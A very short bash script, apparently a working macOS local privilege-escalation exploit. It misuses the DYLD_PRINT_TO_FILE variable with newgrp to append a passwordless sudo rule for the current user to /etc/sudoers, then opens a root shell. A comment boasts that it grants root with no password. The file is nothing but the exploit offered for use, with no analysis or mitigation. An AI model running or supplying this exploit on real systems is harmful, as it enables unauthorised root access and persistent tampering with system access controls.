#!/bin/bash

# another way abusing the shortest one liner ever
# this drops you right into a root shell and puts your current user into the sudo group needing no password to execute commands.

echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s

exit 0
